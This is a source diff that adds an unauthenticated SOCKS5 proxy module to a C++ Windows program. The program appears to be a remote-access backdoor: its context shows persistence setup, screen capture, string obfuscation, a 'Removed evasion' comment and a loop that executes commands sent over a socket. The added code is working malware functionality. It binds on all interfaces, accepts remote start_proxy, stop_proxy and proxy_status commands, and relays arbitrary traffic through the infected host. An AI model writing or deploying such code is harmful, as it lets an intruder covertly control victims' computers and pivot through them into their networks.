@@ -39,6 +39,15 @@ static HANDLE g_screen_sharing_thread = NULL;
 static SOCKET g_screen_sharing_socket = INVALID_SOCKET;
 static CRITICAL_SECTION g_screen_sharing_cs;
 
+// SOCKS5 Proxy globals
+static bool g_proxy_active = false;
+static HANDLE g_proxy_thread = NULL;
+static SOCKET g_proxy_socket = INVALID_SOCKET;
+static CRITICAL_SECTION g_proxy_cs;
+static int g_proxy_port = 0;
+static std::vector<HANDLE> g_proxy_client_threads;
+static std::vector<SOCKET> g_proxy_client_sockets;
+
 // Forward declarations for all functions
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 void establish_persistence();
@@ -64,6 +73,16 @@ bool capture_screen_frame(std::vector<BYTE>& buffer, DWORD& size);
 DWORD WINAPI screen_sharing_thread(LPVOID lpParam);
 std::string start_screen_sharing(SOCKET sock);
 std::string stop_screen_sharing();
+// SOCKS5 Proxy function declarations
+std::string start_socks5_proxy(int port = 0);
+std::string stop_socks5_proxy();
+std::string get_proxy_status();
+DWORD WINAPI socks5_proxy_server_thread(LPVOID lpParam);
+DWORD WINAPI socks5_client_handler_thread(LPVOID lpParam);
+bool socks5_handle_authentication(SOCKET client_socket);
+bool socks5_handle_connection_request(SOCKET client_socket);
+void socks5_relay_data(SOCKET client_socket, SOCKET target_socket);
+int get_available_port();
 // Removed evasion function declarations
 
 // Simple string encryption for basic obfuscation
@@ -687,6 +706,514 @@ std::string stop_screen_sharing()
 
 // ============================================================================
 // END SCREEN SHARING IMPLEMENTATION
+// ============================================================================
+
+// ============================================================================
+// SOCKS5 PROXY IMPLEMENTATION
+// ============================================================================
+
+// Structure to pass data to client handler thread
+struct SOCKS5ClientData {
+    SOCKET client_socket;
+    sockaddr_in client_addr;
+};
+
+// Get an available port for the proxy server
+int get_available_port() {
+    SOCKET test_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (test_socket == INVALID_SOCKET) {
+        return 0;
+    }
+    
+    sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = 0; // Let system choose port
+    
+    if (bind(test_socket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+        closesocket(test_socket);
+        return 0;
+    }
+    
+    int addr_len = sizeof(addr);
+    if (getsockname(test_socket, (sockaddr*)&addr, &addr_len) == SOCKET_ERROR) {
+        closesocket(test_socket);
+        return 0;
+    }
+    
+    int port = ntohs(addr.sin_port);
+    closesocket(test_socket);
+    return port;
+}
+
+// Handle SOCKS5 authentication (we'll use no authentication for simplicity)
+bool socks5_handle_authentication(SOCKET client_socket) {
+    char buffer[256];
+    
+    // Receive authentication methods
+    int bytes_received = recv(client_socket, buffer, 2, 0);
+    if (bytes_received != 2) {
+        return false;
+    }
+    
+    if (buffer[0] != 0x05) { // SOCKS version 5
+        return false;
+    }
+    
+    int num_methods = buffer[1];
+    if (num_methods <= 0 || num_methods > 255) {
+        return false;
+    }
+    
+    // Receive authentication methods
+    bytes_received = recv(client_socket, buffer, num_methods, 0);
+    if (bytes_received != num_methods) {
+        return false;
+    }
+    
+    // Check if no authentication (0x00) is supported
+    bool no_auth_supported = false;
+    for (int i = 0; i < num_methods; i++) {
+        if (buffer[i] == 0x00) {
+            no_auth_supported = true;
+            break;
+        }
+    }
+    
+    // Send authentication response
+    char response[2];
+    response[0] = 0x05; // SOCKS version 5
+    response[1] = no_auth_supported ? 0x00 : 0xFF; // No authentication or no acceptable methods
+    
+    if (send(client_socket, response, 2, 0) != 2) {
+        return false;
+    }
+    
+    return no_auth_supported;
+}
+
+// Handle SOCKS5 connection request
+bool socks5_handle_connection_request(SOCKET client_socket) {
+    char buffer[256];
+    
+    // Receive connection request
+    int bytes_received = recv(client_socket, buffer, 4, 0);
+    if (bytes_received != 4) {
+        return false;
+    }
+    
+    if (buffer[0] != 0x05) { // SOCKS version 5
+        return false;
+    }
+    
+    if (buffer[1] != 0x01) { // Only support CONNECT command
+        // Send error response
+        char error_response[10] = {0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+        send(client_socket, error_response, 10, 0);
+        return false;
+    }
+    
+    if (buffer[2] != 0x00) { // Reserved byte must be 0x00
+        return false;
+    }
+    
+    char address_type = buffer[3];
+    std::string target_host;
+    int target_port;
+    
+    if (address_type == 0x01) { // IPv4 address
+        bytes_received = recv(client_socket, buffer, 6, 0); // 4 bytes IP + 2 bytes port
+        if (bytes_received != 6) {
+            return false;
+        }
+        
+        // Extract IP address
+        char ip_str[16];
+        sprintf_s(ip_str, "%d.%d.%d.%d", 
+                 (unsigned char)buffer[0], (unsigned char)buffer[1], 
+                 (unsigned char)buffer[2], (unsigned char)buffer[3]);
+        target_host = ip_str;
+        
+        // Extract port
+        target_port = ntohs(*(unsigned short*)(buffer + 4));
+        
+    } else if (address_type == 0x03) { // Domain name
+        bytes_received = recv(client_socket, buffer, 1, 0);
+        if (bytes_received != 1) {
+            return false;
+        }
+        
+        int domain_length = (unsigned char)buffer[0];
+        if (domain_length <= 0 || domain_length > 255) {
+            return false;
+        }
+        
+        bytes_received = recv(client_socket, buffer, domain_length + 2, 0); // domain + 2 bytes port
+        if (bytes_received != domain_length + 2) {
+            return false;
+        }
+        
+        target_host = std::string(buffer, domain_length);
+        target_port = ntohs(*(unsigned short*)(buffer + domain_length));
+        
+    } else {
+        // Unsupported address type
+        char error_response[10] = {0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+        send(client_socket, error_response, 10, 0);
+        return false;
+    }
+    
+    // Create connection to target
+    SOCKET target_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (target_socket == INVALID_SOCKET) {
+        char error_response[10] = {0x05, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+        send(client_socket, error_response, 10, 0);
+        return false;
+    }
+    
+    sockaddr_in target_addr;
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(target_port);
+    
+    // Resolve hostname if needed
+    if (address_type == 0x03) {
+        struct addrinfo hints, *result;
+        ZeroMemory(&hints, sizeof(hints));
+        hints.ai_family = AF_INET;
+        hints.ai_socktype = SOCK_STREAM;
+        
+        if (getaddrinfo(target_host.c_str(), NULL, &hints, &result) != 0) {
+            closesocket(target_socket);
+            char error_response[10] = {0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+            send(client_socket, error_response, 10, 0);
+            return false;
+        }
+        
+        target_addr.sin_addr = ((sockaddr_in*)result->ai_addr)->sin_addr;
+        freeaddrinfo(result);
+    } else {
+        if (inet_pton(AF_INET, target_host.c_str(), &target_addr.sin_addr) <= 0) {
+            closesocket(target_socket);
+            char error_response[10] = {0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+            send(client_socket, error_response, 10, 0);
+            return false;
+        }
+    }
+    
+    // Connect to target
+    if (connect(target_socket, (sockaddr*)&target_addr, sizeof(target_addr)) == SOCKET_ERROR) {
+        closesocket(target_socket);
+        char error_response[10] = {0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+        send(client_socket, error_response, 10, 0);
+        return false;
+    }
+    
+    // Send success response
+    char success_response[10] = {0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    if (send(client_socket, success_response, 10, 0) != 10) {
+        closesocket(target_socket);
+        return false;
+    }
+    
+    // Start data relay
+    socks5_relay_data(client_socket, target_socket);
+    
+    closesocket(target_socket);
+    return true;
+}
+
+// Relay data between client and target sockets
+void socks5_relay_data(SOCKET client_socket, SOCKET target_socket) {
+    fd_set read_fds;
+    char buffer[4096];
+    int max_fd = (client_socket > target_socket) ? client_socket : target_socket;
+    
+    // Set sockets to non-blocking mode
+    u_long mode = 1;
+    ioctlsocket(client_socket, FIONBIO, &mode);
+    ioctlsocket(target_socket, FIONBIO, &mode);
+    
+    while (true) {
+        FD_ZERO(&read_fds);
+        FD_SET(client_socket, &read_fds);
+        FD_SET(target_socket, &read_fds);
+        
+        struct timeval timeout;
+        timeout.tv_sec = 30; // 30 second timeout
+        timeout.tv_usec = 0;
+        
+        int activity = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
+        
+        if (activity <= 0) {
+            break; // Timeout or error
+        }
+        
+        // Check for data from client to target
+        if (FD_ISSET(client_socket, &read_fds)) {
+            int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
+            if (bytes_received <= 0) {
+                break;
+            }
+            
+            int bytes_sent = 0;
+            while (bytes_sent < bytes_received) {
+                int sent = send(target_socket, buffer + bytes_sent, bytes_received - bytes_sent, 0);
+                if (sent <= 0) {
+                    return;
+                }
+                bytes_sent += sent;
+            }
+        }
+        
+        // Check for data from target to client
+        if (FD_ISSET(target_socket, &read_fds)) {
+            int bytes_received = recv(target_socket, buffer, sizeof(buffer), 0);
+            if (bytes_received <= 0) {
+                break;
+            }
+            
+            int bytes_sent = 0;
+            while (bytes_sent < bytes_received) {
+                int sent = send(client_socket, buffer + bytes_sent, bytes_received - bytes_sent, 0);
+                if (sent <= 0) {
+                    return;
+                }
+                bytes_sent += sent;
+            }
+        }
+    }
+}
+
+// SOCKS5 client handler thread
+DWORD WINAPI socks5_client_handler_thread(LPVOID lpParam) {
+    SOCKS5ClientData* client_data = (SOCKS5ClientData*)lpParam;
+    SOCKET client_socket = client_data->client_socket;
+    
+    // Handle SOCKS5 authentication
+    if (!socks5_handle_authentication(client_socket)) {
+        closesocket(client_socket);
+        delete client_data;
+        return 0;
+    }
+    
+    // Handle connection request and relay data
+    socks5_handle_connection_request(client_socket);
+    
+    closesocket(client_socket);
+    delete client_data;
+    return 0;
+}
+
+// SOCKS5 proxy server thread
+DWORD WINAPI socks5_proxy_server_thread(LPVOID lpParam) {
+    int port = *(int*)lpParam;
+    
+    // Create server socket
+    SOCKET server_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_socket == INVALID_SOCKET) {
+        EnterCriticalSection(&g_proxy_cs);
+        g_proxy_active = false;
+        LeaveCriticalSection(&g_proxy_cs);
+        return 0;
+    }
+    
+    // Set socket options
+    int opt = 1;
+    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
+    
+    // Bind to port
+    sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(port);
+    
+    if (bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        closesocket(server_socket);
+        EnterCriticalSection(&g_proxy_cs);
+        g_proxy_active = false;
+        LeaveCriticalSection(&g_proxy_cs);
+        return 0;
+    }
+    
+    // Listen for connections
+    if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
+        closesocket(server_socket);
+        EnterCriticalSection(&g_proxy_cs);
+        g_proxy_active = false;
+        LeaveCriticalSection(&g_proxy_cs);
+        return 0;
+    }
+    
+    EnterCriticalSection(&g_proxy_cs);
+    g_proxy_socket = server_socket;
+    g_proxy_port = port;
+    LeaveCriticalSection(&g_proxy_cs);
+    
+    // Accept client connections
+    while (true) {
+        EnterCriticalSection(&g_proxy_cs);
+        bool should_continue = g_proxy_active;
+        LeaveCriticalSection(&g_proxy_cs);
+        
+        if (!should_continue) {
+            break;
+        }
+        
+        sockaddr_in client_addr;
+        int client_addr_len = sizeof(client_addr);
+        SOCKET client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_addr_len);
+        
+        if (client_socket == INVALID_SOCKET) {
+            if (WSAGetLastError() == WSAEINTR) {
+                break; // Server socket was closed
+            }
+            continue;
+        }
+        
+        // Create client data structure
+        SOCKS5ClientData* client_data = new SOCKS5ClientData;
+        client_data->client_socket = client_socket;
+        client_data->client_addr = client_addr;
+        
+        // Create thread to handle client
+        HANDLE client_thread = CreateThread(
+            NULL,
+            0,
+            socks5_client_handler_thread,
+            client_data,
+            0,
+            NULL
+        );
+        
+        if (client_thread != NULL) {
+            EnterCriticalSection(&g_proxy_cs);
+            g_proxy_client_threads.push_back(client_thread);
+            g_proxy_client_sockets.push_back(client_socket);
+            LeaveCriticalSection(&g_proxy_cs);
+        } else {
+            closesocket(client_socket);
+            delete client_data;
+        }
+    }
+    
+    closesocket(server_socket);
+    return 0;
+}
+
+// Start SOCKS5 proxy server
+std::string start_socks5_proxy(int port) {
+    EnterCriticalSection(&g_proxy_cs);
+    
+    if (g_proxy_active) {
+        LeaveCriticalSection(&g_proxy_cs);
+        return "SOCKS5 proxy is already running on port " + std::to_string(g_proxy_port);
+    }
+    
+    // If no port specified, get an available one
+    if (port == 0) {
+        port = get_available_port();
+        if (port == 0) {
+            LeaveCriticalSection(&g_proxy_cs);
+            return "Failed to find available port for SOCKS5 proxy";
+        }
+    }
+    
+    g_proxy_active = true;
+    LeaveCriticalSection(&g_proxy_cs);
+    
+    // Create proxy server thread
+    int* port_param = new int(port);
+    g_proxy_thread = CreateThread(
+        NULL,
+        0,
+        socks5_proxy_server_thread,
+        port_param,
+        0,
+        NULL
+    );
+    
+    if (g_proxy_thread == NULL) {
+        EnterCriticalSection(&g_proxy_cs);
+        g_proxy_active = false;
+        LeaveCriticalSection(&g_proxy_cs);
+        delete port_param;
+        return "Failed to create SOCKS5 proxy server thread";
+    }
+    
+    // Wait a moment for the server to start
+    Sleep(500);
+    
+    return "SOCKS5 proxy started successfully on port " + std::to_string(port) + 
+           "\nConfigure your applications to use SOCKS5 proxy: 127.0.0.1:" + std::to_string(port);
+}
+
+// Stop SOCKS5 proxy server
+std::string stop_socks5_proxy() {
+    EnterCriticalSection(&g_proxy_cs);
+    
+    if (!g_proxy_active) {
+        LeaveCriticalSection(&g_proxy_cs);
+        return "SOCKS5 proxy is not running";
+    }
+    
+    g_proxy_active = false;
+    
+    // Close server socket to stop accepting new connections
+    if (g_proxy_socket != INVALID_SOCKET) {
+        closesocket(g_proxy_socket);
+        g_proxy_socket = INVALID_SOCKET;
+    }
+    
+    // Close all client sockets
+    for (SOCKET client_socket : g_proxy_client_sockets) {
+        closesocket(client_socket);
+    }
+    g_proxy_client_sockets.clear();
+    
+    LeaveCriticalSection(&g_proxy_cs);
+    
+    // Wait for server thread to finish
+    if (g_proxy_thread != NULL) {
+        WaitForSingleObject(g_proxy_thread, 3000); // 3 second timeout
+        CloseHandle(g_proxy_thread);
+        g_proxy_thread = NULL;
+    }
+    
+    // Wait for client threads to finish
+    EnterCriticalSection(&g_proxy_cs);
+    for (HANDLE client_thread : g_proxy_client_threads) {
+        WaitForSingleObject(client_thread, 1000); // 1 second timeout per thread
+        CloseHandle(client_thread);
+    }
+    g_proxy_client_threads.clear();
+    LeaveCriticalSection(&g_proxy_cs);
+    
+    g_proxy_port = 0;
+    
+    return "SOCKS5 proxy stopped successfully";
+}
+
+// Get proxy status
+std::string get_proxy_status() {
+    EnterCriticalSection(&g_proxy_cs);
+    
+    if (!g_proxy_active) {
+        LeaveCriticalSection(&g_proxy_cs);
+        return "SOCKS5 proxy is not running";
+    }
+    
+    int port = g_proxy_port;
+    int active_connections = g_proxy_client_sockets.size();
+    
+    LeaveCriticalSection(&g_proxy_cs);
+    
+    return "SOCKS5 proxy is running on port " + std::to_string(port) + 
+           "\nActive connections: " + std::to_string(active_connections) +
+           "\nProxy address: 127.0.0.1:" + std::to_string(port);
+}
+
+// ============================================================================
+// END SOCKS5 PROXY IMPLEMENTATION
 // ============================================================================
 
 // List all running processes
@@ -2685,6 +3212,9 @@ int main()
 
     // Initialize critical section for screen sharing
     InitializeCriticalSection(&g_screen_sharing_cs);
+    
+    // Initialize critical section for SOCKS5 proxy
+    InitializeCriticalSection(&g_proxy_cs);
 
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
@@ -2880,6 +3410,43 @@ int main()
                 response = stop_screen_sharing();
                 send(sock, response.c_str(), response.length(), 0);
                 std::cout << "Screen sharing stopped: " << response << std::endl;
+            }
+            else if (strcmp(buffer, "start_proxy") == 0 || strncmp(buffer, "start_proxy ", 12) == 0)
+            {
+                std::cout << "Starting SOCKS5 proxy..." << std::endl;
+                
+                int port = 0;
+                if (strncmp(buffer, "start_proxy ", 12) == 0) {
+                    // Extract port number if provided
+                    std::string port_str = buffer + 12;
+                    port_str.erase(0, port_str.find_first_not_of(" \t\r\n"));
+                    port_str.erase(port_str.find_last_not_of(" \t\r\n") + 1);
+                    
+                    if (!port_str.empty()) {
+                        port = atoi(port_str.c_str());
+                        if (port <= 0 || port > 65535) {
+                            port = 0; // Use auto-assigned port if invalid
+                        }
+                    }
+                }
+                
+                response = start_socks5_proxy(port);
+                send(sock, response.c_str(), response.length(), 0);
+                std::cout << "SOCKS5 proxy command processed: " << response << std::endl;
+            }
+            else if (strcmp(buffer, "stop_proxy") == 0)
+            {
+                std::cout << "Stopping SOCKS5 proxy..." << std::endl;
+                response = stop_socks5_proxy();
+                send(sock, response.c_str(), response.length(), 0);
+                std::cout << "SOCKS5 proxy stopped: " << response << std::endl;
+            }
+            else if (strcmp(buffer, "proxy_status") == 0)
+            {
+                std::cout << "Getting SOCKS5 proxy status..." << std::endl;
+                response = get_proxy_status();
+                send(sock, response.c_str(), response.length(), 0);
+                std::cout << "SOCKS5 proxy status: " << response << std::endl;
             }
             else if (strcmp(buffer, "kill_client") == 0)
             {
@@ -3210,7 +3777,9 @@ int main()
     
     // Cleanup (this should never be reached due to infinite loop, but good practice)
     stop_screen_sharing(); // Stop any active screen sharing
+    stop_socks5_proxy(); // Stop any active SOCKS5 proxy
     DeleteCriticalSection(&g_screen_sharing_cs);
+    DeleteCriticalSection(&g_proxy_cs);
     WSACleanup();
     Gdiplus::GdiplusShutdown(gdiplusToken);
     
